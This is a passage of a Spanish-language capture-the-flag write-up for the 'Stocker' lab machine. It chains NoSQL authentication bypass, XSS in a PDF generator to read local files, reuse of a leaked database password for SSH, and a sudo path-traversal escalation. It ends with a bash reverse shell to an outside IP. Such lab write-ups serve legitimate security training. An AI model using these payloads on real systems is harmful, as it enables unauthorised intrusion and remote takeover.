Response   Lines    Word       Chars       Payload                                                                         =====================================================================000000834:   302        0 L      4 W        28 Ch       \"dev\"Fuzzeamos en la parte donde van los subdominios y encontramos dev.stocker.htb, vamos a incorporarlo a nuestro /etc/hosts y ver que nos resuelve la web.curl http://dev.stocker.htb -I -v* Host dev.stocker.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.196*   Trying 10.10.11.196:80...* Connected to dev.stocker.htb (10.10.11.196) port 80&gt; HEAD / HTTP/1.1&gt; Host: dev.stocker.htb&gt; User-Agent: curl/8.5.0&gt; Accept: */*&gt; &lt; HTTP/1.1 302 FoundHTTP/1.1 302 Found&lt; Server: nginx/1.18.0 (Ubuntu)Server: nginx/1.18.0 (Ubuntu)&lt; Date: Mon, 29 Apr 2024 12:59:32 GMTDate: Mon, 29 Apr 2024 12:59:32 GMT&lt; Content-Type: text/plain; charset=utf-8Content-Type: text/plain; charset=utf-8&lt; Content-Length: 28Content-Length: 28&lt; Connection: keep-aliveConnection: keep-alive&lt; X-Powered-By: ExpressX-Powered-By: Express&lt; Location: /loginLocation: /login&lt; Vary: AcceptVary: Accept&lt; Set-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnlySet-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnlyEs importante observar cada detalle de la web que estamos auditando, asi podemos deducir el lenguaje con el que esta programado la aplicacion web.Tenemos un panel de acceso a login, puede ser vulnerable a SQL injection o NoSQL injection, vamos a comprobarlo ahora, hay mas probabilidad de que sea vulnerable a NoSQLI por diferentes motivos, una de ellas es que en las tecnologias que implementa aplicacion web es que esta desarrollado en Express JS y NodeJS, maneja entradas de application/jsonSQL Injectioncurl dev.stocker.htb/login -d \"username='&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d \"username='+or+1=1--+-&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d \"username='+or+sleep(10)--+-&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":\"\\'\",\"password\":\"test\"}' -H 'Content-Type: application/json'; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":\"\\' or 1=1-- -\",\"password\":\"test\"}' -H 'Content-Type: application/json'; echoFound. Redirecting to /login?error=login-errorSiempre que vemos un panel de acceso quiero intentar bypassearlo de diferentes maneras, ya sea Inyecciones SQL o NoSQL (',\") pero como dije antes, estas inyecciones fallaron porque creemos que por detras existe un Mongo DB y no un MySQL como base de datos, quiere decir que la vulnerabilidad puede estar por un NoSQLINoSQL Injection y Bypass Authenticationcurl dev.stocker.htb/login -d 'username[$ne]=test&amp;password[$ne]=test'; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":{\"$ne\":\"test\"},\"password\":{\"$ne\":\"test\"}}' -H 'Content-Type: application/json'; echoFound. Redirecting to /stockYa tenemos una inyeccion exitosa, es importante que en la peticion agreguemos la cabezera Content-Type: application/json porque estamos enviando data en formato json, vamos reenviarlo por el puerto 127.0.0.1:8080 al burpsuite desde curlEste es el payload que usamos en la inyeccion para bypassear la autenticacion{\"username\":{\"$ne\": \"test\"}, \"password\": {\"$ne\":\"test\"}}Esto hara lo siguiente: siempre que haya al menos un usuario que no sea “test” y una contraseña que no sea “test”, ese usuario sera devuelto y iniciara sesion.curl dev.stocker.htb/login -d $'{\"username\":{\"$ne\":\"test\"},\"password\":{\"$ne\":\"test\"}}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080copiamos y pegamos la cookie de sesion y ya bypasseamos el panel de loginParece una aplicación web para comprar cosas raras. Hay 4 articulos en la web que Podemos agregar al carrito de compras.cuando hacemos click en ver carrito, se nos abre esta ventana indicando todos los componentes que agregamos. Vamos a darle a submit purchaseVemos un enlace en here que nos reedirige a http://dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a un comprobante de pago en PDF, esto nos resuelve a una api que esta a la vista del publico y expuesta. Para desglosar el PDF y ver el origen del mismo, procedemos al descargo y comprobar con exiftool de que se trata.Si ejecutamos exiftool en este documento, veremos que se genera usando Chromium (Skia/PDF m108):curl -s dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a | exiftool -  ExifTool Version Number         : 12.50File Size                       : 0 bytesFile Modification Date/Time     : 2023:01:14 00:00:00+01:00File Access Date/Time           : 2023:01:14 00:00:00+01:00File Inode Change Date/Time     : 2023:01:14 00:00:00+01:00File Permissions                : prw-rw----File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Tagged PDF                      : YesCreator                         : ChromiumProducer                        : Skia/PDF m108Create Date                     : 2023:01:13 23:00:00+00:00Modify Date                     : 2023:01:13 23:00:00+00:00en /stocks existe un flujo de peticiones importantes como /api/products, muestra toda la informacion sobre los productos que vende la aplicacion webEl comportamiento de esta aplicacion web es agregar un articulo a mi carrito y destella una ventana emergente, sin embargo no llega a enviar ninguna solicitud, por lo que ni siquiera se almacena de manera local, sino simplemente en el JavaScript del lado del cliente en ejecución.Interceptamos el boton submit purchaseincluye los articulos a comprar y algunos campos que podemos modificar y ver como se comporta la web.en la anterior imagen modificamos el valor de amount a no poner nada y dejarlo vacio, esto provoco un error en la web y nos devolvio algunas rutas que podriamos aprovechar si logramos conseguir algun File Inclusion.XSSHay una carga util que podemos utilizar para comprobar si es vulnerable a XSS.&lt;img src=\\\"x\\\" onerror=\\\"document.write('test')\\\" /&gt;Y porque elegimos el campo title?, es simple. Porque ese campo se ve reflejado en el comprobante de pago del PDF que generamos.La web informa que la compra se realizo correctamente. Al visitar la URL de esa orden de compra ( /api/po/[id]) muestra que funciono:test sobrescribio todo el resto del HTML/CSS que estaba creando el PDF.Read Local FileYa tenemos identificada la vulnerabilidad de XSS pero aparte de eso podemos derivarlo a una Lectura de archivos locales, de que manera logramos dicho objetivo?. Si una página web está creando un PDF utilizando una entrada controlada por el usuario, puedes intentar engañar al bot que está creando el PDF para que ejecute código JS arbitrario. Entonces, si el bot creador de PDF encuentra algún tipo de etiquetas HTML, las interpretará y puede abusar de este comportamiento para provocar un XSS en el servidor. Read Local File&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\"GET\",\"file:///etc/passwd\");x.send();&lt;/script&gt;tenemos que escapar las comillas dobles porque si no no funciona el payload&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\\\"GET\\\",\\\"file:///etc/passwd\\\");x.send();&lt;/script&gt;En el comprobante de pago vemos lo siguiente: una cadena codificada en base64, vamos a decodificarla con el siguiente comandoecho \"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci\" | base64 -droot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usrbase64: entrada inválidaExcelente!!! Vemos el /etc/passwd, en este punto ya podemos decir que estamos ante un File Inclusion y podemos ver archivos del sistema, lo siguiente sera ver el codigo fuente para escalar esta vulnerabilidad.Pero vemos solo una parte del /etc/passwd, es decir solo las primeras 3 lineas. Para verlo completo podemos inyectar este payload:&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;Otro payload que puede funcionar y tener un mejor resultado a la hora de leer archivos internos de la maquina es este&lt;img src=\\\"x\\\" onerror=\\\"document.write('&lt;iframe src=file:///etc/passwd width=100% height=100%&gt;&lt;/iframe&gt;')\\\" /&gt;Ya que tenemos perfeccionado lo de leer correctamente los archivos, quedaria tratar de leer el codigo fuente de la aplicacion web “index.js” de /var/www/dev/index.jsconst express = require(\"express\");const mongoose = require(\"mongoose\");const session = require(\"express-session\");const MongoStore = require(\"connect-mongo\");const path = require(\"path\");const fs = require(\"fs\");const {    generatePDF,    formatHTML} = require(\"./pdf.js\");const {    randomBytes,    createHash} = require(\"crypto\");const app = express();const port = 3000;// TODO: Configure loading from dotenv for productionconst dbURI = \"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource = admin &amp; w = 1 \";app.use(express.json());app.use(express.urlencoded({    extended: false}));app.use(    session({        secret: randomBytes(32).toString(\"hex\"),        resave: false,        saveUninitialized: true,        store: MongoStore.create({            mongoUrl: dbURI,        }),    }));app.use(\"/static\", express.static(__dirname + \"/assets\"));app.get(\"/\", (req, res) =&gt; {    return res.redirect(\"/login\");});app.get(\"/api/products\", async (req, res) =&gt; {    if (!req.session.user) return res.json([]);    const products = await mongoose.model(\"Product\").find();    return res.json(products);});app.get(\"/login\", (req, res) =&gt; {    if (req.session.user) return res.redirect(\"/stock\");    return res.sendFile(__dirname + \"/templates/login.html\");});app.post(\"/login\", async (req, res) =&gt; {    const {        username,        password    } = req.body;    if (!username || !password) return res.redirect(\"/login?error=login-error\");    // TODO: Implement hashing    const user = await mongoose.model(\"User\").findOne({        username,        password    });    if (!user) return res.redirect(\"/login?error=login-error\");    req.session.user = user.id;    console.log(req.session);    return res.redirect(\"/stock\");});app.post(\"/api/order\", async (req, res) =&gt; {                if (!req.session.user) return res.json({});                if (!req.body.basket) return res.json({                    success: false                });                const order = new mongoose.model(\"Order\")({                            items: req.body.basket.map((item) =&gt; ({                                title: item.title,                                price: item.price,                                amount: item.amount                            })),Si analizamos bien el codigo, logramos ver en la parte superior credenciales de acceso a la base de datos const dbURI = \"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?Tambien tenemos un usuario del sistema llamado “angoose”root:x:0:0:root:/root:/bin/bashsshd:x:111:65534::/run/sshd:/usr/sbin/nologinfwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinangoose:x:1001:1001:,,,:/home/angoose:/bin/bashProbamos las credenciales que encontramos via ssh por el puerto 22 con el usuario angoosessh angoose@stocker.htbPassword:IHeardPassphrasesArePrettySecureangoose@stocker:~$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255        ether 00:50:56:b9:4d:1b  txqueuelen 1000  (Ethernet)        RX packets 148246  bytes 13714635 (13.7 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 127921  bytes 19524574 (19.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        loop  txqueuelen 1000  (Local Loopback)        RX packets 15696  bytes 2585569 (2.5 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 15696  bytes 2585569 (2.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0angoose@stocker:~$ hostname -I10.10.11.196Bingo!!!! Tenemos una shell por ssh, en esta parte ya podriamos ver la flag de user.txt, ahora solo quedaria enumerar el sistema y escalar privilegios.Enumeracion del SistemaVersion de Linux y Kernelangoose@stocker:~$ uname -aLinux stocker 5.4.0-136-generic #153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxangoose@stocker:~$ lsb_release -aNo LSB modules are available.Distributor ID:\tUbuntuDescription:\tUbuntu 20.04.5 LTSRelease:\t20.04Codename:\tfocalSUDOVamos a ver si a nivel de SUDOERS tiene algun permiso para ejecutar algo como rootangoose@stocker:~$ sudo -l[sudo] password for angoose: Matching Defaults entries for angoose on stocker:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser angoose may run the following commands on stocker:    (ALL) /usr/bin/node /usr/local/scripts/*.jsY como dijimos antes vemos que a nivel de sudoers nos deja ejecutar como root la herramienta node cualquier .js script que se encuentre en esa carpeta, pero jugando un poco con bash podemos bypassear esa entrada y ejecutar codigo malicioso en jsEscalada de Privilegios [RCE JAVASCRIPT]sudo /usr/bin/node /usr/local/scripts/../../../../dev/shm/pwned.jsEl problema aquí es que, si bien el administrador claramente quería permitir que angoose solo ejecutara scripts desde ese directorio, * esto indica que cualquier script que se encuentre ahi lo va ejecutar pero no tenemos permisos de escritura para crear un archivo JS malicioso, asi que un ../ nos dejara ejecutar cualquier JS en el sistema de archivos.require(\"child_process\").exec('ping -c 1 10.10.16.2')Vamos a crear el script que contiene JS malicioso y lo vamos a guardar en /dev/shm/pwned.jsPrimero vamos a probar ejecuntando el comando ping a nuestra maquinaShell como Rootrequire(\"child_process\").exec('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1\"')"
  }
  
]

